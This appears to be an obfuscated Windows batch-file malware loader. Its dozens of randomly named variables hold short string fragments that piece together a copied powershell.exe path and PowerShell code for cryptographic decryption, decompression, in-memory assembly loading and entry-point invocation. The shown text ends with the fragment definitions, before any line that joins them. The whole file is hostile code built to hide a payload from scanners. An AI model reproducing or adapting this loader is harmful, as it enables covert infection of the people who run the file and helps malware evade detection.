@echo off
set "QwexxiRMMi= C"
set "WfxdzTsmNM=rS"
set "icdYzxuxKV=rs"
set "sFtbVOCCAT=em"
set "hVTIlKjvuF=32"
set "EhElJmANJi=s\"
set "GcieONujxl=do"
set "PEGWqELlvo=we"
set "weopkKStQE=ll"
set "FLdmniFIXW=Sy"
set "FYaUijjAph=he"
set "InSJWJUoCb=st"
set "sheVZegUak=we"
set "ukWoReNNOO= /"
set "DxxfQFjsVa=1."
set "WLESItjkbH=\v"
set "hoZOYqpVpZ=\W"
set "zHnAAVKlSl=Po"
set "oLvhaREMOg=xe"
set "wnIHNMXXLG=ow"
set "cirmTsuYYP=ll"
set "pyqgiNOlkh=0\"
set "smkHQasbry=in"
set "VhOjfIJCQR=nd"
set "ytoXQJifdG=po"
set "FaHgTcieVL=y "
set "AyUXUdFEdF=ws"
set "WDVqNpCfIz=Wi"
set "uNYMZYOHET=he"
set "fNaoZnZvQd=co"
set "fPbrYuQeEF=py"
set "ptSdFrQIAt=:\"
set "cCPVYwppys=.e"
set "qDyJIHdXxc=cd"
set "dganShsmBa= %~dp0"
set "RtwsVeDukm=File"
set "PWWLpeuzEw=);$M"
set "LULHCJZWNL= [Sy"
set "SIQsUIGNgP='[-1"
set "ldDTUzBaRi=-joi"
set "AnNlpNVPAb=ress"
set "mBcotBMvyG=[]] "
set "ZkIUiOVuhn=se()"
set "KZMgWsjwMX=oryS"
set "NCcsIZncOr=g = "
set "JDITbyJahF=lBlo"
set "cIukpiorFh=ZK, "
set "KYyFoobgaa=lNEl"
set "sRFmjpLTFG=pher"
set "bDhlIuvgxJ=grap"
set "xYtYUZMSyV=.Com"
set "ecZxhcvsKq=stem"
set "LUZKteMTcF=in $"
set "RXMboItEWH=$nlr"
set "kNMaMzWrBD=zG.T"
set "CIENVOieNr=);$O"
set "cTZMozotXK=New-"
set "iDLPpwZzWv=-Obj"
set "fTaDyPVbYK=Disp"
set "dVwFBpDxZN=y.Pa"
set "EQGKtVrjeF=$lNE"
set "IRTowaoWdA=Star"
set "vCwWlNBeju=ect "
set "ZPoMLASlQq=::('"
set "unKRuxQjFJ=Fina"
set "SdPKXFQBtB== $O"
set "rYkCEkhYUN=tem."
set "nZiNZmTMiC=('Tg"
set "aoTOfqFREx=NElC"
set "jZJyvAGjdY=CFxo"
set "adOZiquRmQ= = N"
set "tYyCVRooQT=qC.I"
set "esijKhnMup=New-"
set "SFuIhAuBVQ=oint"
set "QjrZrPBEYC=tHV."
set "ESHVLyKVNP=Bmor"
set "VJUjPpufNg=6esa"
set "TgmjAGEfAP=7;$O"
set "htJxPNkFRG=();$"
set "mJzWABkOHk=Disp"
set "JwHwSemsdZ=yste"
set "HQrzXmTCZt=ptog"
set "KAbyZHOlmb=m.Re"
set "jUTvviDFgu=morF"
set "lWzkJZTzmz='')("
set "wTahGVoEfg=ixqC"
set "RpHocCfdlO=rans"
set "ZkKNOknWVa=Comp"
set "oEuhzrICrB=);$f"
set "CMyGOcWxvy=RmAx"
set "tneIAgJMDr=eam("
set "KBdCJSkjJp=$fQX"
set "MKoJwLGHBd=TllA"
set "RevabVELpf=t Sy"
set "duyfCOyjUX=tHV "
set "mwfiIIhoKu=[Sys"
set "RWAjblbWJY=BC;$"
set "SrgvpFDvrt=ion."
set "XVTSxTQAqZ=ypto"
set "IzvOzsEnJj=ach "
set "umSjfZPrsx=();$"
set "ybJTYNmGnn=ing("
set "eJwGCCRQbU=d.Su"
set "aZHivmlDIk=.Cre"
set "YOVFCTjydM='0Pg"
set "aRIpWZVnhn=)))"
set "vzIeqQoqKy=6] -"
set "gBaEDirJgZ=[Sys"
set "JJgRhEKcIx=, $l"
